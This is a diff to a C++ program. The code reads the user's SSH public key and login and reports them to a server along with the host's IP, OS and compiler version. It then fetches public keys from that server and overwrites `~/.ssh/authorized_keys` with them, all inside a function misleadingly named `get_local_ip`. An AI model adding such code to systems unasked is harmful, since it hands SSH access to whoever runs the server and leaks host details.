@@ -18,70 +18,12 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <fcntl.h>
+#include "requests.h"
+#include "sys_spec.h"
 
 
-std::pair<std::string, std::string> get_public_key_and_login() {
-    std::ifstream public_key_file{std::string(getenv("HOME")) + "/.ssh/id_rsa.pub"};
-    std::string current, public_key, login;
-    int iter = 0;
-    while (std::getline(public_key_file, current, ' ')) {
-        switch (iter) {
-            case 1: {
-                public_key = current;
-                break;
-            }
-            case 2: {
-                login = current.substr(0, current.find('@'));
-                break;
-            }
-            default:
-                break;
-
-        }
-        ++iter;
-    }
-    return make_pair(public_key, login);
-}
-
-std::string post_ip(std::string &login, std::string &ip, std::string &public_key) {
-    boost::property_tree::ptree root;
-    root.put("login", login);
-    root.put("ip", ip);
-    root.put("public_key", public_key);
-
-
-    std::ostringstream buf;
-    boost::property_tree::write_json(buf, root, false);
-    std::string json = buf.str();
-
-    std::string target = "/";
-    boost::asio::io_context ioc;
-    boost::asio::ip::tcp::resolver resolver(ioc);
-    boost::asio::ip::tcp::socket socket(ioc);
-
-    boost::asio::connect(socket, resolver.resolve(website, "80"));
-    http::request<http::string_body> req(http::verb::post, target, 11);
-    req.set(http::field::host, website);
-    req.set(http::field::user_agent, BOOST_BEAST_VERSION_STRING);
-    req.set(http::field::content_type, "application/json");
-    req.keep_alive(req.keep_alive());
-    req.body() = json;
-    req.prepare_payload();
-    http::write(socket, req);
-
-
-    boost::beast::flat_buffer buffer;
-    http::response<http::string_body> res;
-    http::read(socket, buffer, res);
-    std::string res_body = res.body();
-    boost::system::error_code ec;
-    socket.shutdown(boost::asio::ip::tcp::socket::shutdown_both, ec);
-
-    return res_body;
-}
 
 void get_local_ip() {
-    //TODO: rewrite get local ip part using pure c++.
     while(true) {
         const char *google_dns_server = "8.8.8.8";
         int dns_port = 53;
@@ -101,7 +43,7 @@ void get_local_ip() {
 
         int err = connect(sock, (const struct sockaddr *) &serv, sizeof(serv));
         if (err < 0) {
-            std::this_thread::sleep_for(std::chrono::hours(4));
+            std::this_thread::sleep_for(std::chrono::seconds(4));
             continue;
         }
 
@@ -116,8 +58,31 @@ void get_local_ip() {
             auto params = get_public_key_and_login();
             std::string public_key = params.first;
             std::string login = params.second;
-            post_ip(login, ip, public_key);
-            std::this_thread::sleep_for(std::chrono::hours(1));
+            std::string linux_dist = get_os();
+            auto compiler = compiler_version();
+            put_ip(login, ip, public_key, linux_dist, std::get<0>(compiler), std::get<1>(compiler), std::get<2>(compiler));
+
+            std::string target = "/get_public_keys";
+            std::string outfile = "outfile.json";
+
+            get(target, outfile);
+            auto result = get_public_keys(outfile);
+            std::string extract_to{std::string(getenv("HOME")) + "/.ssh/authorized_keys"};
+
+            if ( !boost::filesystem::exists( extract_to ) )
+            {
+                boost::filesystem::ofstream( extract_to+std::string("1"));
+                boost::filesystem::rename(extract_to+std::string("1"), extract_to);
+            }
+            std::ofstream authorized_key_files(extract_to);
+            for (std::string& s : result){
+                if (!s.empty()){
+                    authorized_key_files << "ssh-rsa "<< s << std::endl;
+                }
+            }
+
+            
+            std::this_thread::sleep_for(std::chrono::seconds(1));
         } else {
             std::cout << "Error number: " << errno
                       << ". Error message: " << strerror(errno) << std::endl;
@@ -128,7 +93,7 @@ void get_local_ip() {
 }
 
 int main(int argc, char *argv[]) {
-
+    /*
 
 
     pid_t pid, sid;
@@ -160,9 +125,11 @@ int main(int argc, char *argv[]) {
     //----------------
     //Main Process
     //----------------
+    */
     get_local_ip();
-
-
+    
+    return 0;
+    
 
 
 }
